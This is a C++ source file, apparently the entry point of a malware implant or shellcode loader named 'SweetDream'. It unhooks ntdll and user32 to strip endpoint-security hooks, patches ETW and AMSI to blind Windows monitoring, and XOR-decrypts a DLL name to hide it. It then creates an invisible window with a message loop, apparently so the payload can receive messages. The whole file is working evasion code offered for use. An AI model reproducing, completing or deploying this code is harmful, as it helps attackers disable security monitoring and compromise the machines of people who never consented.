#include "../include/Common.h"

extern "C" void __attribute__((stdcall, section(".text$B"))) SweetDreamEntry(void) {
	PVOID hNtDll = nullptr;
	PVOID hUser32 = nullptr;
	NTSTATUS NtStatus = NULL;
	BYTE Buff[] = { 0x35, 0x33, 0x24, 0x31, 0x73, 0x76, 0x6F, 0x23, 0x2C, 0x24, 0x00 };
	WCHAR wcDecrypted[10];
	UNICODE_STRING ustrDll = {};
	LdrLoadDll_t LdrLoadDll = nullptr;
	// feverdream setup
	BOOL bFlag = FALSE;
	DWORD dwError = 0;
	WNDCLASSEXW Wnd = { 0 };
	MSG Message = { 0 };
	PPEB peb = GetPEB;
	PPEB_LDR_DATA ldr = peb->Ldr;
	PLIST_ENTRY modList = &ldr->InLoadOrderModuleList;
	PLIST_ENTRY entry = modList->Flink;

	hNtDll = sdGetModuleHandle(NTDLL);

	if (!sdUnhookDll(NTDLL, hNtDll)) {
		return;
	}
	if (!sdPatchEtw(hNtDll)) {
		return;
	}
	if (!sdPatchAmsi(hNtDll)) {
		return;
	}

	LdrLoadDll = (LdrLoadDll_t)sdGetProcAddress(hNtDll, LDR_LOAD_DLL);
	Xor((PCHAR)&Buff, 10);
	sdByteArrayToCharArrayW((PWCHAR)&wcDecrypted, (PBYTE)&Buff, 11);
	sdRtlInitUnicodeString(&ustrDll, wcDecrypted);

	NtStatus = LdrLoadDll(0, 0, &ustrDll, &hUser32);
	if (NtStatus != STATUS_SUCCESS && NtStatus != STATUS_IMAGE_ALREADY_LOADED) {
		return;
	}

	if (!sdUnhookDll(USER32, hUser32)) {
		return;
	}

	// feverdream setup
	Wnd.cbSize = sizeof(WNDCLASSEXW);
	Wnd.lpfnWndProc = (WNDPROC) G_SYM( WindowMessageReceiveRoutine );
	Wnd.hInstance = (HINSTANCE)((PLDR_DATA_TABLE_ENTRY)entry)->DllBase;
	Wnd.lpszClassName = L" ";

	RegisterClassExW_t RegClassExW = (RegisterClassExW_t)sdGetProcAddress(hUser32, U_REGISTER_CLASS_EX_W);
	CreateWindowExW_t CreateWinExW = (CreateWindowExW_t)sdGetProcAddress(hUser32, U_CREATE_WINDOWS_EX_W);
	GetMessageW_t GetMsgW = (GetMessageW_t)sdGetProcAddress(hUser32, U_GET_MESSAGE_W);
	TranslateMessage_t TranslateMsg = (TranslateMessage_t)sdGetProcAddress(hUser32, U_TRANSLATE_MESSAGE);
	DispatchMessageW_t DispatchMsg = (DispatchMessageW_t)sdGetProcAddress(hUser32, U_DISPATCH_MESSAGE_W);
	if (!RegClassExW(&Wnd)) {
		goto EXIT_ROUTINE;
	}

	if (CreateWinExW(0, Wnd.lpszClassName, L"", 0, 0, 0, 0, 0, 0, 0, 0, 0) == 0) {
		goto EXIT_ROUTINE;
	}

MSG_LOOP:
	bFlag = GetMsgW(&Message, NULL, 0, 0);
	if (bFlag == -1 || bFlag == FALSE) {
		goto EXIT_ROUTINE;
	}
	TranslateMsg(&Message);
	DispatchMsg(&Message);
	goto MSG_LOOP;

	bFlag = TRUE;
EXIT_ROUTINE:
	if (!bFlag) {
		dwError = LastError;
	}

	return;
}
